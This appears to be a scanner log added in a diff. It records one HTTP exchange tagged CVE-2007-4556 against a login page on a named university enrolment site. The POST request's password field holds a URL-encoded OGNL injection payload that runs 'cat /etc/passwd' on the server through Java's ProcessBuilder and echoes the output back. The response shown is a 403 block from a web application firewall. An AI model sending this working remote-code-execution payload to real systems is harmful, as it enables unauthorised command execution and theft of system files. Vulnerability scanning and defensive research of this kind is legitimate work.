@@ -1,0 +1,27 @@
+[CVE-2007-4556] Dumped HTTP request for https://enrolments.hildas.unimelb.edu.au/login.action
+
+
+POST /login.action HTTP/1.1
+Host: enrolments.hildas.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 596
+Accept: */*
+Accept-Language: en
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+username=test&password=%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22cat%22%2C%22%2Fetc%2Fpasswd%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D
+
+[CVE-2007-4556] Dumped HTTP response https://enrolments.hildas.unimelb.edu.au/login.action
+
+HTTP/1.1 403 Forbidden
+Connection: close
+Content-Length: 833
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Set-Cookie: visid_incap_3211538=nTlSScLsSD+1KT6/php52wxyk2gAAAAAQUIPAAAAAABIfUY4aAshYvKIcqbnA4kc; expires=Thu, 06 Aug 2026 07:06:46 GMT; HttpOnly; path=/; Domain=.hildas.unimelb.edu.au
+Set-Cookie: incap_ses_237_3211538=eEWyRDU2rhiK6barov5JAwxyk2gAAAAAgXId5auT7TUtbOIrGHEUHQ==; path=/; Domain=.hildas.unimelb.edu.au
+X-Iinfo: 10-8314105-0 NNNN RT(1754493453269 15) q(0 0 -1 -1) r(0 -1) B15(3,1001,1) U6
+
+<html style="height:100%"><head><META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW"><meta name="format-detection" content="telephone=no"><meta name="viewport" content="initial-scale=1.0"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><script src="/Front-Night-supt-I-keepe-mans-his-rauing-it-of-N" async></script></head><body style="margin:0px;height:100%"><iframe id="main-iframe" src="/_Incapsula_Resource?CWUDNSAI=23&xinfo=10-8314105-0%20NNNN%20RT%281754493453269%2015%29%20q%280%200%20-1%20-1%29%20r%280%20-1%29%20B15%283%2c1001%2c1%29%20U6&incident_id=237000430032587158-42329312194267850&edet=15&cinfo=03000000cefb&rpinfo=0&mth=POST" frameborder=0 width="100%" height="100%" marginheight="0px" marginwidth="0px">Request unsuccessful. Incapsula incident ID: 237000430032587158-42329312194267850</iframe></body></html>
